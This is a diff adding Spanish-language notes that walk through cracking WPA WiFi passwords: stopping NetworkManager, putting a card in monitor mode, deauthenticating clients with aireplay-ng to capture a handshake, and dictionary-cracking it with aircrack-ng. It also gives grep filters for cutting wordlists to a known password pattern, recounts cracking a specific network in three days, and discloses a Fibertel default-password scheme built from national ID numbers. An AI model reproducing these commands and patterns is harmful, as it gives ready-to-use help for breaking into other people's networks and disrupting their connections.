@@ -1,0 +1,75 @@
+
+
+service network-manager stop # En algunas distros es NetworkManager
+sudo systemctl stop NetworkManager 
+airmon-ng check kill
+iwconfig # Identifica tu dispositivo de red(en mi caso wlp1s0)
+sudo airmon-ng start wlp1s0 # o wlan0 para ponerlo en modo monitor, en modo monitor tu internet dejará de funcionar, salvo que tengas dos antenas wifi.
+sudo airodump-ng wlp1s0 # Para escuchar paquetes (tiene que estar en modo monitor) de ahí elegí la mac address de cualquier red para usarla en el siguiente comando.
+sudo airodump-ng -w wificapture -c NUMERO_CANAL --bssid ... wlp1s0 # wificapture para capturar el handshake
+sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opción -D
+#### Ahora podemos crear una carpeta para guardar el handshake
+mkdir handshake
+cd handshake
+### Escuchamos para capturar el handshake
+`airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap`
+### Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)
+`aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.`
+O podés hacerlo sin el cliente `sin la opción -c` pero agregando `-D`
+Cuando el handshake es capturado se guardará en el directorio en donde estás situado.
+sudo airmon-ng stop wlp1s0 # detiene el modo monitor
+
+
+### Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.
+`aircrack-ng handshake.cap -w passwords.txt`
+
+En hay un diccionario muy conocido que se llama rockyou.txt y hay una página que se llama: https://weakpass.com
+
+O podes subir el handshake a wpa-sec.stanev.org
+
+---
+
+Como romper por diccionario
+==============================
+Si alguna vez descubriste alguna contraseña ya sabes el patrón que usa para sus contraseñas, entonces podes filtrar de una gran lista, esto lo expliqué mejor en mi blog https://imlauera.github.io en la publicación que se llama: Atacando redes WiFis y explotando vulnerabilidades de computadoras dentro de ellas.
+
+
+
+Salio la clave. Antes por ataque de WPS pude descubrir que uso una palabra y 4 numeros. Entonces baje el diccionario de latin en weakpass y filtre las palabras que contengan EXACTAMENTE 4 numeros al final con `grep`, si alguno sabe una mejor forma de hacer esto diganme. De un diccionario de 11 gigas pase a uno de 1,7 gigas. En 3 dias salio clave solo con CPU (`Intel Celeron 2.0GHz`)
+
+grep -E '\b([^0-9]*[0-9]){4}$[^0-9]*\b' weakpass_4.latin.txt > sanchez_dicc1
+grep -E '^[^0-9]*([0-9]){4}$' sanchez_dicc1 > sanchez_dicc2
+
+Supongamos que corremos el diccionario de 46 gigabytes o hacemos un ataque de gemelo malvado o hacemos un ataque de WPS o hacemos un ataque de WEP (obsoleto) y encontramos que la contraseña es: sakura2629
+
+Ahora ya conocemos el patrón de la contraseña.
+
+Entonces tomamos un diccionario de 46 gigas y aplicamos los siguientes filtros:
+
+1. Cómo mínimo la contraseña tiene que ser 8 caracteres.
+2. Solo nos quedamos con las palabras que tengan exactamente 4 números AL FINAL.
+
+3. Creamos 3 diccionarios:
+* Solo nos quedamos con las palabras que contengan sakura: menos de 1 megabyte.
+* Solo nos quedamos con las palabras que contengan 26: aprox. 500 megabytes que lo podés probar en 3 horas.
+* Solo nos quedamos con las palabras que contengan 29: aprox. 500 megabytes que lo podés probar en 3 horas.
+
+Es decir de un diccionario de 46 gigabytes nos quedamos con 3 diccionarios que lo podemos probar en menos de 1 día.
+
+---
+
+Las redes WiFi que contienen "Fibertel" usan el siguiente patrón 
+=====================================================================================
+
+Ejemplo nombre de red: Fibertel WiFi fjw 
+
+Ejemplo de contraseñas:
+004+DNI+fjw
+003+DNI+fjw
+001+DNI+fjw
+002+DNI+fjw
+014+DNI+fjw
+420+DNI+fjw
+412+DNI+fjw
+
+Hay un repositorio en GitHub que tiene un script en python que te genera ese script para usarlo con el aircrack o con el hashcat.
